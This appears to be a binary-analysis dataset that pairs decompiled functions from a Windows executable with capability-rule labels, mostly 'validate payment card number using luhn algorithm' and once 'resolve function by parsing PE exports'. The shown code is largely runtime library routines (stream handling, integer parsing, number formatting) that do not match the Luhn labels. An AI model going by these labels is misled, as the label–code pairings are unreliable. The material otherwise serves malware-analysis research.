{
    "004010d0": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t * fcn.004010d0(int32_t *param_1, int32_t *param_2)\n\n{\n    code *pcVar1;\n    char cVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint uVar5;\n    int32_t *piVar6;\n    uint32_t uVar7;\n    char *pcVar8;\n    int32_t *in_FS_OFFSET;\n    bool bVar9;\n    ulong uVar10;\n    int32_t *var_8h;\n    int32_t *var_ch_2;\n    uint var_10h;\n    uint var_ch;\n    uint32_t uStack80;\n    uint var_3ch;\n    int32_t *var_28h;\n    uint var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    uint32_t var_18h;\n    uint var_14h;\n    uint32_t *puStack20;\n    int32_t var_ch_3;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x423450;\n    var_ch_3 = *in_FS_OFFSET;\n    uStack80 = *0x48e22c ^ &stack0xfffffffc;\n    puStack20 = &uStack80;\n    *in_FS_OFFSET = &var_ch_3;\n    uVar7 = 0;\n    var_14h = 0;\n    piVar6 = var_ch_2;\n    do {\n        cVar2 = *piVar6;\n        piVar6 = piVar6 + 1;\n    } while (cVar2 != '\\0');\n    var_18h = piVar6 - (var_ch_2 + 1);\n    uVar4 = *(*(*var_8h + 4) + 0x20 + var_8h);\n    var_1ch = *(*(*var_8h + 4) + 0x24 + var_8h);\n    if ((var_1ch < 0) || ((var_1ch < 1 && (((uVar4 == 0 || (var_1ch < 0)) || ((var_1ch < 1 && (uVar4 <= var_18h))))))))\n    {\n        _var_20h = 0;\n        var_1ch = 0;\n        var_20h = 0;\n    }\n    else {\n        var_20h = uVar4 - var_18h;\n        var_1ch = var_1ch - (uVar4 < var_18h);\n    }\n    piVar6 = var_8h;\n    fcn.00401d30(var_8h);\n    if (var_24h == '\\0') {\n        uVar7 = 4;\n    }\n    else {\n        var_4h = 0;\n        if ((*(*(*var_8h + 4) + 0x14 + var_8h) & 0x1c0) != 0x40) {\n            while ((-1 < var_1ch && ((0 < var_1ch || (var_20h != 0))))) {\n                piVar6 = *(*var_8h + 4) & 0xffffff00 | *(*(*var_8h + 4) + 0x40 + var_8h);\n                iVar3 = fcn.00404a60();\n                if (iVar3 == -1) goto code_r0x00401205;\n                bVar9 = var_20h != 0;\n                var_20h = var_20h + -1;\n                var_1ch = var_1ch + -1 + bVar9;\n            }\n        }\n        uVar5 = 0;\n        uVar10 = fcn.00404aa0();\n        piVar6 = var_ch_2;\n        if ((uVar10 == var_18h) && (uVar10 >> 0x20 == 0)) {\n            while ((-1 < var_1ch && ((0 < var_1ch || (var_20h != 0))))) {\n                piVar6 = *(*var_8h + 4) & 0xffffff00 | *(*(*var_8h + 4) + 0x40 + var_8h);\n                iVar3 = fcn.00404a60(uVar5, piVar6);\n                if (iVar3 == -1) goto code_r0x00401205;\n                bVar9 = var_20h != 0;\n                var_20h = var_20h + -1;\n                var_1ch = var_1ch + -1 + bVar9;\n            }\n        }\n        else {\ncode_r0x00401205:\n            uVar7 = 4;\n            var_14h = 4;\n        }\n        iVar3 = *(*var_8h + 4);\n        *(iVar3 + 0x20 + var_8h) = 0;\n        *(iVar3 + 0x24 + var_8h) = 0;\n        var_4h = 0xffffffff;\n    }\n    iVar3 = *(*var_8h + 4);\n    uVar4 = 4;\n    if (*(var_8h + iVar3 + 0x38) != 0) {\n        uVar4 = 0;\n    }\n    uVar7 = uVar4 | *(var_8h + iVar3 + 0xc) & 0x17 | uVar7;\n    *(var_8h + iVar3 + 0xc) = uVar7;\n    uVar7 = *(var_8h + iVar3 + 0x10) & uVar7;\n    if (uVar7 != 0) {\n        if ((uVar7 & 4) == 0) {\n            pcVar8 = \"ios_base::failbit set\";\n            if ((uVar7 & 2) == 0) {\n                pcVar8 = \"ios_base::eofbit set\";\n            }\n        }\n        else {\n            pcVar8 = \"ios_base::badbit set\";\n        }\n        uVar5 = fcn.00404800(&var_28h, 1, piVar6);\n        fcn.00401c60(pcVar8, uVar5);\n        fcn.00407c30(&var_3ch, 0x430780);\n        pcVar1 = swi(3);\n        piVar6 = (*pcVar1)();\n        return piVar6;\n    }\n    cVar2 = fcn.00404da8();\n    if (cVar2 == '\\0') {\n        fcn.00403180();\n    }\n    piVar6 = *(*(*var_28h + 4) + 0x38 + var_28h);\n    if (piVar6 != NULL) {\n        (**(*piVar6 + 8))();\n    }\n    *in_FS_OFFSET = var_ch_3;\n    return var_8h;\n}\n",
        "token_count": 1548
    },
    "00404300": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00404300(int32_t *param_1)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    uint32_t *puVar3;\n    char cVar4;\n    int32_t iVar5;\n    uint uVar6;\n    uint32_t uVar7;\n    uint unaff_EBX;\n    char *pcVar8;\n    uint32_t uVar9;\n    int32_t *in_FS_OFFSET;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint32_t uStack80;\n    uint var_3ch;\n    uint var_28h;\n    int32_t *var_24h;\n    uint32_t var_20h;\n    int32_t *var_1ch;\n    uint var_18h;\n    uint32_t var_14h_2;\n    uint32_t *puStack20;\n    int32_t var_ch_2;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x4234f0;\n    var_ch_2 = *in_FS_OFFSET;\n    uStack80 = *0x48e22c ^ &stack0xfffffffc;\n    puStack20 = &uStack80;\n    *in_FS_OFFSET = &var_ch_2;\n    piVar1 = *(*(*param_1 + 4) + 0x38 + param_1);\n    var_24h = param_1;\n    var_14h_2 = uStack80;\n    puVar3 = &uStack80;\n    if (piVar1 != NULL) {\n        fcn.00401d30(param_1);\n        if (var_18h != '\\0') {\n            uVar9 = 0;\n            var_20h = 0;\n            var_4h = 0;\n            iVar5 = (**(*piVar1 + 0x34))();\n            uVar7 = 4;\n            if (iVar5 == -1) {\n                uVar9 = 4;\n            }\n            var_4h = 0xffffffff;\n            iVar5 = *(*param_1 + 4);\n            if (*(param_1 + iVar5 + 0x38) != 0) {\n                uVar7 = 0;\n            }\n            uVar7 = uVar7 | uVar9 | *(param_1 + iVar5 + 0xc) & 0x17;\n            *(param_1 + iVar5 + 0xc) = uVar7;\n            uVar7 = *(param_1 + iVar5 + 0x10) & uVar7;\n            var_20h = uVar9;\n            if (uVar7 != 0) {\n                if ((uVar7 & 4) == 0) {\n                    pcVar8 = \"ios_base::failbit set\";\n                    if ((uVar7 & 2) == 0) {\n                        pcVar8 = \"ios_base::eofbit set\";\n                    }\n                }\n                else {\n                    pcVar8 = \"ios_base::badbit set\";\n                }\n                uVar6 = fcn.00404800(&var_28h, 1);\n                fcn.00401c60(pcVar8, uVar6);\n                fcn.00407c30(&var_3ch, 0x430780);\n                pcVar2 = swi(3);\n                (*pcVar2)();\n                return;\n            }\n        }\n        cVar4 = fcn.00404da8();\n        if (cVar4 == '\\0') {\n            fcn.00403180();\n        }\n        piVar1 = *(*(*var_1ch + 4) + 0x38 + var_1ch);\n        puVar3 = puStack20;\n        if (piVar1 != NULL) {\n            (**(*piVar1 + 8))();\n            puVar3 = puStack20;\n        }\n    }\n    puStack20 = puVar3;\n    *in_FS_OFFSET = var_ch_2;\n    fcn.00406dcc(unaff_EBX);\n    return;\n}\n",
        "token_count": 908
    },
    "00404450": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop",
            "resolve function by parsing PE exports"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00404450(int32_t *param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    code *pcVar3;\n    uint32_t uVar4;\n    uint uVar5;\n    int32_t *piVar6;\n    int32_t *piVar7;\n    char *pcVar8;\n    int32_t ****ppppiVar9;\n    char *pcVar10;\n    int32_t *unaff_EBX;\n    int32_t *unaff_EBP;\n    int32_t *piVar11;\n    uint uVar12;\n    int32_t *arg_8h;\n    int32_t ****ppppiStack36;\n    int32_t iStack32;\n    uchar auStack28 [12];\n    uint32_t uStack16;\n    uint uStack12;\n    uint uStack8;\n    uint32_t uStack4;\n    \n    uStack4 = *0x48e22c ^ &stack0xffffffd0;\n    uVar12 = 0x48f248;\n    uVar5 = fcn.004010d0(0x48f248, param_2);\n    fcn.004013c0(uVar5);\n    piVar11 = NULL;\n    iVar2 = *(param_1[0xf] + 0x78 + param_1);\n    iStack32 = iVar2 + param_1;\n    piVar6 = *(iVar2 + 0x20 + param_1) + param_1;\n    ppppiStack36 = *(iStack32 + 0x18);\n    piVar7 = param_2;\n    arg_8h = piVar6;\n    if (ppppiStack36 != NULL) {\n        do {\n            pcVar10 = *piVar6 + param_1;\n            uStack12 = 0;\n            uStack8 = 0;\n            _auStack28 = ZEXT816(0);\n            pcVar8 = pcVar10;\n            do {\n                cVar1 = *pcVar8;\n                pcVar8 = pcVar8 + 1;\n            } while (cVar1 != '\\0');\n            fcn.00401330(uVar12, pcVar8 - (pcVar10 + 1), pcVar10);\n            iVar2 = piVar7 + 1;\n            do {\n                cVar1 = *piVar7;\n                piVar7 = piVar7 + 1;\n            } while (cVar1 != '\\0');\n            ppppiVar9 = &ppppiStack36;\n            if (0xf < uStack16) {\n                ppppiVar9 = ppppiStack36;\n            }\n            piVar6 = unaff_EBX;\n            if (auStack28._8_4_ == piVar7 - iVar2) {\n                while (uVar4 = auStack28._8_4_ - 4,  3 < auStack28._8_4_) {\n                    if (*ppppiVar9 != *piVar6) goto code_r0x0040453a;\n                    ppppiVar9 = ppppiVar9 + 1;\n                    piVar6 = piVar6 + 1;\n                    auStack28._8_4_ = uVar4;\n                }\n                if (uVar4 != 0xfffffffc) {\ncode_r0x0040453a:\n                    if ((*ppppiVar9 != *piVar6) ||\n                       ((uVar4 != 0xfffffffd &&\n                        ((*(ppppiVar9 + 1) != *(piVar6 + 1) ||\n                         ((uVar4 != 0xfffffffe &&\n                          ((*(ppppiVar9 + 2) != *(piVar6 + 2) ||\n                           ((uVar4 != 0xffffffff && (*(ppppiVar9 + 3) != *(piVar6 + 3)))))))))))))\n                    goto code_r0x00404567;\n                }\n                if (0xf < uStack16) {\n                    ppppiVar9 = ppppiStack36;\n                    if ((uStack16 + 1 < 0x1000) ||\n                       (ppppiVar9 = ppppiStack36[-1],  ppppiStack36 + (-4 - ppppiVar9) < 0x20)) {\n                        fcn.00406db9(ppppiVar9);\n                        fcn.00406dcc(unaff_EBP);\n                        return;\n                    }\ncode_r0x0040462d:\n                    fcn.0040b82f();\n                    pcVar3 = swi(3);\n                    (*pcVar3)();\n                    return;\n                }\n                break;\n            }\ncode_r0x00404567:\n            piVar6 = unaff_EBP + 1;\n            piVar7 = unaff_EBX;\n            param_1 = arg_8h;\n            if (0xf < uStack16) {\n                ppppiVar9 = ppppiStack36;\n                if ((0xfff < uStack16 + 1) && (ppppiVar9 = ppppiStack36[-1],  0x1f < ppppiStack36 + (-4 - ppppiVar9)))\n                goto code_r0x0040462d;\n                fcn.00406db9(ppppiVar9);\n                piVar7 = unaff_EBX;\n                param_1 = arg_8h;\n            }\n            piVar11 = piVar11 + 1;\n            unaff_EBP = piVar6;\n            unaff_EBX = piVar7;\n            arg_8h = param_1;\n        } while (piVar11 < param_2);\n    }\n    fcn.00406dcc(arg_8h);\n    return;\n}\n",
        "token_count": 1253
    },
    "0040bcae": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0040bcae(int32_t arg_8h, uint8_t *arg_ch, uint8_t **arg_10h, uint32_t arg_14h, uint32_t arg_18h)\n\n{\n    uint8_t uVar1;\n    uint8_t *puVar2;\n    char cVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint8_t uVar6;\n    uint8_t *puVar7;\n    uint var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    puVar2 = arg_ch;\n    cVar3 = fcn.0040d4fb();\n    if (cVar3 == '\\0') {\ncode_r0x0040bcf3:\n        if (arg_10h != NULL) {\n            *arg_10h = arg_ch;\n        }\n        return 0;\n    }\n    if ((arg_14h != 0) && ((arg_14h < 2 || (0x24 < arg_14h)))) {\n        *(arg_8h + 0x1c) = 1;\n        *(arg_8h + 0x18) = 0x16;\n        fcn.0040b7a2(0, 0, 0, 0, 0, arg_8h);\n        goto code_r0x0040bcf3;\n    }\n    var_ch = 0;\n    uVar6 = *arg_ch;\n    puVar7 = arg_ch + 1;\n    var_8h = arg_18h & 0xff;\n    uVar5 = var_4h & 0xffffff00;\n    if (uVar6 == 0x2d) {\n        var_8h = var_8h | 2;\ncode_r0x0040bd38:\n        uVar6 = *puVar7;\n        puVar7 = arg_ch + 2;\n    }\n    else if (uVar6 == 0x2b) goto code_r0x0040bd38;\n    var_4h = uVar5 | uVar6;\n    arg_ch = puVar7;\n    if ((arg_14h != 0) && (arg_14h != 0x10)) goto code_r0x0040bdbf;\n    if (uVar6 - 0x30 < 10) {\n        iVar4 = uVar6 + -0x30;\ncode_r0x0040bd78:\n        if (iVar4 == 0) {\n            uVar1 = *puVar7;\n            var_10h = var_10h & 0xffffff00 | uVar1;\n            if ((uVar1 == 0x78) || (uVar1 == 0x58)) {\n                if (arg_14h == 0) {\n                    arg_14h = 0x10;\n                }\n                uVar6 = puVar7[1];\n                var_4h = uVar5 | uVar6;\n                arg_ch = puVar7 + 2;\n            }\n            else {\n                if (arg_14h == 0) {\n                    arg_14h = 8;\n                }\n                fcn.0040d43b(var_10h);\n                arg_ch = puVar7 + 1;\n            }\n            goto code_r0x0040bdbf;\n        }\n    }\n    else {\n        if (uVar6 + 0x9f < 0x1a) {\n            iVar4 = uVar6 + -0x57;\n            goto code_r0x0040bd78;\n        }\n        if (uVar6 + 0xbf < 0x1a) {\n            iVar4 = uVar6 + -0x37;\n            goto code_r0x0040bd78;\n        }\n    }\n    if (arg_14h == 0) {\n        arg_14h = 10;\n    }\ncode_r0x0040bdbf:\n    while( true ) {\n        if (uVar6 - 0x30 < 10) {\n            uVar5 = uVar6 - 0x30;\n        }\n        else if (uVar6 + 0x9f < 0x1a) {\n            uVar5 = uVar6 - 0x57;\n        }\n        else if (uVar6 + 0xbf < 0x1a) {\n            uVar5 = uVar6 - 0x37;\n        }\n        else {\n            uVar5 = 0xffffffff;\n        }\n        if (arg_14h <= uVar5) break;\n        uVar6 = *arg_ch;\n        var_4h = var_4h & 0xffffff00 | uVar6;\n        uVar5 = uVar5 + var_ch * arg_14h;\n        var_8h = var_8h | (uVar5 < var_ch * arg_14h || 0xffffffff / arg_14h < var_ch) << 2 | 8;\n        arg_ch = arg_ch + 1;\n        var_ch = uVar5;\n    }\n    fcn.0040d43b(var_4h);\n    if ((var_8h & 8) == 0) {\n        if (arg_10h == NULL) {\n            return 0;\n        }\n        *arg_10h = puVar2;\n        return 0;\n    }\n    cVar3 = fcn.0040bc4c(var_8h, var_ch);\n    if (cVar3 == '\\0') {\n        if ((var_8h & 2) != 0) {\n            var_ch = -var_ch;\n        }\n    }\n    else {\n        *(arg_8h + 0x1c) = 1;\n        *(arg_8h + 0x18) = 0x22;\n        if ((var_8h & 1) != 0) {\n            if ((var_8h & 2) == 0) {\n                if (arg_10h != NULL) {\n                    *arg_10h = arg_ch;\n                }\n                return 0x7fffffff;\n            }\n            if (arg_10h != NULL) {\n                *arg_10h = arg_ch;\n            }\n            return 0x80000000;\n        }\n        var_ch = 0xffffffff;\n    }\n    if (arg_10h != NULL) {\n        *arg_10h = arg_ch;\n        return var_ch;\n    }\n    return var_ch;\n}\n",
        "token_count": 1445
    },
    "00412da4": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.00412da4(int32_t arg_8h, uint16_t *arg_ch, uint16_t **arg_10h, uint32_t arg_14h, uint32_t arg_18h)\n\n{\n    uint16_t *puVar1;\n    char cVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint16_t uVar5;\n    uint32_t arg_8h_00;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    puVar1 = arg_ch;\n    cVar2 = fcn.0040d4fb();\n    if (cVar2 == '\\0') {\ncode_r0x00412ded:\n        if (arg_10h != NULL) {\n            *arg_10h = arg_ch;\n        }\n        return 0;\n    }\n    if ((arg_14h != 0) && ((arg_14h < 2 || (0x24 < arg_14h)))) {\n        *(arg_8h + 0x1c) = 1;\n        *(arg_8h + 0x18) = 0x16;\n        fcn.0040b7a2(0, 0, 0, 0, 0, arg_8h);\n        goto code_r0x00412ded;\n    }\n    var_4h = 0;\n    arg_8h_00 = *arg_ch;\n    arg_ch = arg_ch + 1;\n    if (*(arg_8h + 0x14) == '\\0') {\n        fcn.0040d4a0();\n    }\n    while (iVar3 = fcn.00419309(arg_8h_00, 8),  iVar3 != 0) {\n        arg_8h_00 = *arg_ch;\n        arg_ch = arg_ch + 1;\n    }\n    arg_18h = arg_18h & 0xff;\n    if (arg_8h_00 == 0x2d) {\n        arg_18h = arg_18h | 2;\ncode_r0x00412e57:\n        arg_8h_00 = *arg_ch;\n        arg_ch = arg_ch + 1;\n    }\n    else if (arg_8h_00 == 0x2b) goto code_r0x00412e57;\n    var_8h = 0x660;\n    if ((arg_14h != 0) && (arg_14h != 0x10)) goto code_r0x00413156;\n    uVar5 = arg_8h_00;\n    if (uVar5 < 0x30) goto code_r0x004130e3;\n    iVar3 = 0x30;\n    if (uVar5 < 0x3a) {\ncode_r0x00412f86:\n        iVar3 = -iVar3;\ncode_r0x004130de:\n        iVar3 = arg_8h_00 + iVar3;\n        if (iVar3 == -1) goto code_r0x004130e3;\ncode_r0x00413108:\n        if (iVar3 == 0) {\n            uVar4 = *arg_ch;\n            if ((uVar4 == 0x78) || (uVar4 == 0x58)) {\n                if (arg_14h == 0) {\n                    arg_14h = 0x10;\n                }\n                arg_8h_00 = arg_ch[1];\n                arg_ch = arg_ch + 2;\n            }\n            else {\n                if (arg_14h == 0) {\n                    arg_14h = 8;\n                }\n                fcn.0040d464(uVar4);\n                arg_ch = arg_ch + 1;\n            }\n            goto code_r0x00413156;\n        }\n    }\n    else {\n        if (uVar5 < 0xff10) {\n            if ((0x65f < uVar5) &&\n               ((iVar3 = var_8h,  uVar5 < 0x66a ||\n                ((iVar3 = 0x6f0,  0x6ef < uVar5 &&\n                 ((uVar5 < 0x6fa ||\n                  ((iVar3 = 0x966,  0x965 < uVar5 &&\n                   ((uVar5 < 0x970 ||\n                    ((iVar3 = 0x9e6,  0x9e5 < uVar5 &&\n                     ((uVar5 < 0x9f0 ||\n                      ((iVar3 = 0xa66,  0xa65 < uVar5 &&\n                       ((uVar5 < 0xa70 ||\n                        ((iVar3 = 0xae6,  0xae5 < uVar5 &&\n                         ((uVar5 < 0xaf0 ||\n                          ((iVar3 = 0xb66,  0xb65 < uVar5 &&\n                           ((uVar5 < 0xb70 ||\n                            ((iVar3 = 0xc66,  0xc65 < uVar5 &&\n                             ((uVar5 < 0xc70 ||\n                              ((iVar3 = 0xce6,  0xce5 < uVar5 &&\n                               ((uVar5 < 0xcf0 ||\n                                ((iVar3 = 0xd66,  0xd65 < uVar5 &&\n                                 ((uVar5 < 0xd70 ||\n                                  ((iVar3 = 0xe50,  0xe4f < uVar5 &&\n                                   ((uVar5 < 0xe5a ||\n                                    ((iVar3 = 0xed0,  0xecf < uVar5 &&\n                                     ((uVar5 < 0xeda ||\n                                      ((iVar3 = 0xf20,  0xf1f < uVar5 &&\n                                       ((uVar5 < 0xf2a ||\n                                        ((iVar3 = 0x1040,  0x103f < uVar5 &&\n                                         ((uVar5 < 0x104a ||\n                                          ((iVar3 = 0x17e0,  0x17df < uVar5 &&\n                                           ((uVar5 < 0x17ea || ((iVar3 = 0x1810,  0x180f < uVar5 && (uVar5 < 0x181a)))))\n                                           )))))))))))))))))))))))))))))))))))))))))))))))))))))))))\n            goto code_r0x00412f86;\n        }\n        else if (uVar5 < 0xff1a) {\n            iVar3 = -0xff10;\n            goto code_r0x004130de;\n        }\ncode_r0x004130e3:\n        if (((0x40 < arg_8h_00) && (arg_8h_00 < 0x5b)) || (arg_8h_00 - 0x61 < 0x1a)) {\n            uVar4 = arg_8h_00;\n            if (arg_8h_00 - 0x61 < 0x1a) {\n                uVar4 = arg_8h_00 - 0x20;\n            }\n            iVar3 = uVar4 - 0x37;\n            goto code_r0x00413108;\n        }\n    }\n    if (arg_14h == 0) {\n        arg_14h = 10;\n    }\ncode_r0x00413156:\n    do {\n        uVar5 = arg_8h_00;\n        if (uVar5 < 0x30) {\ncode_r0x004132bb:\n            if (((arg_8h_00 < 0x41) || (0x5a < arg_8h_00)) && (0x19 < arg_8h_00 - 0x61)) {\n                uVar4 = 0xffffffff;\n            }\n            else {\n                uVar4 = arg_8h_00;\n                if (arg_8h_00 - 0x61 < 0x1a) {\n                    uVar4 = arg_8h_00 - 0x20;\n                }\n                uVar4 = uVar4 - 0x37;\n            }\n        }\n        else {\n            if (0x39 < uVar5) {\n                iVar3 = 0xff10;\n                if (uVar5 < 0xff10) {\n                    iVar3 = 0x660;\n                    if (0x65f < uVar5) {\n                        if (uVar5 < 0x66a) {\ncode_r0x004132b1:\n                            iVar3 = -iVar3;\n                            goto code_r0x004132b6;\n                        }\n                        iVar3 = 0x6f0;\n                        if (0x6ef < uVar5) {\n                            if (uVar5 < 0x6fa) goto code_r0x004132b1;\n                            iVar3 = 0x966;\n                            if (0x965 < uVar5) {\n                                if (uVar5 < 0x970) goto code_r0x004132b1;\n                                iVar3 = 0x9e6;\n                                if (0x9e5 < uVar5) {\n                                    if (uVar5 < 0x9f0) goto code_r0x004132b1;\n                                    iVar3 = 0xa66;\n                                    if (0xa65 < uVar5) {\n                                        if (uVar5 < 0xa70) goto code_r0x004132b1;\n                                        iVar3 = 0xae6;\n                                        if (0xae5 < uVar5) {\n                                            if (uVar5 < 0xaf0) goto code_r0x004132b1;\n                                            iVar3 = 0xb66;\n                                            if (0xb65 < uVar5) {\n                                                if (uVar5 < 0xb70) goto code_r0x004132b1;\n                                                iVar3 = 0xc66;\n                                                if (0xc65 < uVar5) {\n                                                    if (uVar5 < 0xc70) goto code_r0x004132b1;\n                                                    iVar3 = 0xce6;\n                                                    if (0xce5 < uVar5) {\n                                                        if (uVar5 < 0xcf0) goto code_r0x004132b1;\n                                                        iVar3 = 0xd66;\n                                                        if (0xd65 < uVar5) {\n                                                            if (uVar5 < 0xd70) goto code_r0x004132b1;\n                                                            iVar3 = 0xe50;\n                                                            if (0xe4f < uVar5) {\n                                                                if (uVar5 < 0xe5a) goto code_r0x004132b1;\n                                                                iVar3 = 0xed0;\n                                                                if (0xecf < uVar5) {\n                                                                    if (uVar5 < 0xeda) goto code_r0x004132b1;\n                                                                    iVar3 = 0xf20;\n                                                                    if (0xf1f < uVar5) {\n                                                                        if (uVar5 < 0xf2a) goto code_r0x004132b1;\n                                                                        iVar3 = 0x1040;\n                                                                        if (0x103f < uVar5) {\n                                                                            if (uVar5 < 0x104a) goto code_r0x004132b1;\n                                                                            iVar3 = 0x17e0;\n                                                                            if (0x17df < uVar5) {\n                                                                                if (uVar5 < 0x17ea)\n                                                                                goto code_r0x004132b1;\n                                                                                iVar3 = 0x1810;\n                                                                                if (0x180f < uVar5) {\n                                                                                    var_84h._0_2_ = 0x181a;\n                                                                                    goto code_r0x004132af;\n                                                                                }\n                                                                            }\n                                                                        }\n                                                                    }\n                                                                }\n                                                            }\n                                                        }\n                                                    }\n                                                }\n                                            }\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n                else {\n                    var_88h._0_2_ = 0xff1a;\n                    var_84h._0_2_ = var_88h;\ncode_r0x004132af:\n                    if (uVar5 < var_84h) goto code_r0x004132b1;\n                }\n                goto code_r0x004132bb;\n            }\n            iVar3 = -0x30;\ncode_r0x004132b6:\n            uVar4 = arg_8h_00 + iVar3;\n            if (uVar4 == 0xffffffff) goto code_r0x004132bb;\n        }\n        if (arg_14h <= uVar4) {\n            fcn.0040d464(arg_8h_00);\n            if ((arg_18h & 8) == 0) {\n                if (arg_10h == NULL) {\n                    return 0;\n                }\n                *arg_10h = puVar1;\n                return 0;\n            }\n            cVar2 = fcn.0040bc4c(arg_18h, var_4h);\n            if (cVar2 == '\\0') {\n                if ((arg_18h & 2) != 0) {\n                    var_4h = -var_4h;\n                }\n            }\n            else {\n                *(arg_8h + 0x1c) = 1;\n                *(arg_8h + 0x18) = 0x22;\n                if ((arg_18h & 1) != 0) {\n                    if ((arg_18h & 2) == 0) {\n                        if (arg_10h != NULL) {\n                            *arg_10h = arg_ch;\n                        }\n                        return 0x7fffffff;\n                    }\n                    if (arg_10h != NULL) {\n                        *arg_10h = arg_ch;\n                    }\n                    return 0x80000000;\n                }\n                var_4h = 0xffffffff;\n            }\n            if (arg_10h != NULL) {\n                *arg_10h = arg_ch;\n                return var_4h;\n            }\n            return var_4h;\n        }\n        uVar4 = var_4h * arg_14h + uVar4;\n        arg_18h = arg_18h | (uVar4 < var_4h * arg_14h || 0xffffffff / arg_14h < var_4h) << 2 | 8;\n        arg_8h_00 = *arg_ch;\n        arg_ch = arg_ch + 1;\n        var_4h = uVar4;\n    } while( true );\n}\n",
        "token_count": 3419
    },
    "00414765": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t __cdecl\nfcn.00414765(uint32_t *arg_8h, uchar *arg_ch, uint32_t arg_10h, uint arg_14h, uint arg_18h, int32_t arg_1ch, \n            uint arg_20h, uint arg_24h, uint arg_28h, int32_t arg_2ch)\n\n{\n    char cVar1;\n    int16_t iVar2;\n    int16_t iVar3;\n    uint16_t uVar4;\n    uint16_t uVar5;\n    int32_t iVar6;\n    char *pcVar7;\n    char *pcVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    uint32_t extraout_ECX;\n    uint32_t extraout_ECX_00;\n    uint32_t extraout_ECX_01;\n    char *pcVar11;\n    char *pcVar12;\n    bool bVar13;\n    uint var_2ch;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint32_t var_18h;\n    uint var_14h;\n    uint32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    if (arg_1ch < 0) {\n        arg_1ch = 0;\n    }\n    *arg_ch = 0;\n    if (arg_10h <= arg_1ch + 0xbU) {\n        *(arg_2ch + 0x1c) = 1;\n        *(arg_2ch + 0x18) = 0x22;\n        fcn.0040b7a2(0, 0, 0, 0, 0, arg_2ch);\n        return 0x22;\n    }\n    uVar9 = arg_8h[1];\n    if ((uVar9 >> 0x14 & 0x7ff) == 0x7ff) {\n        iVar6 = fcn.00414a91(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch, 0, arg_24h, arg_28h, arg_2ch);\n        if (iVar6 != 0) {\n            *arg_ch = 0;\n            return iVar6;\n        }\n        pcVar7 = fcn.004230b0(arg_ch, 0x65);\n        if (pcVar7 == NULL) {\n            return 0;\n        }\n        *pcVar7 = (arg_20h ^ 1) * ' ' + 'P';\n        pcVar7[3] = '\\0';\n        return 0;\n    }\n    if ((uVar9 < 1) && (uVar9 < 0)) {\n        *arg_ch = 0x2d;\n        arg_ch = arg_ch + 1;\n        uVar9 = arg_8h[1];\n    }\n    pcVar7 = arg_ch + 1;\n    var_10h = 0x3ff;\n    iVar2 = (arg_20h ^ 1) * 0x20 + 7;\n    if ((uVar9 & 0x7ff00000) == 0) {\n        *arg_ch = 0x30;\n        uVar9 = *arg_8h | arg_8h[1] & 0xfffff;\n        var_10h = uVar9;\n        if (uVar9 != 0) {\n            var_10h = 0x3fe;\n            goto code_r0x0041487c;\n        }\n    }\n    else {\n        *arg_ch = 0x31;\ncode_r0x0041487c:\n        uVar9 = 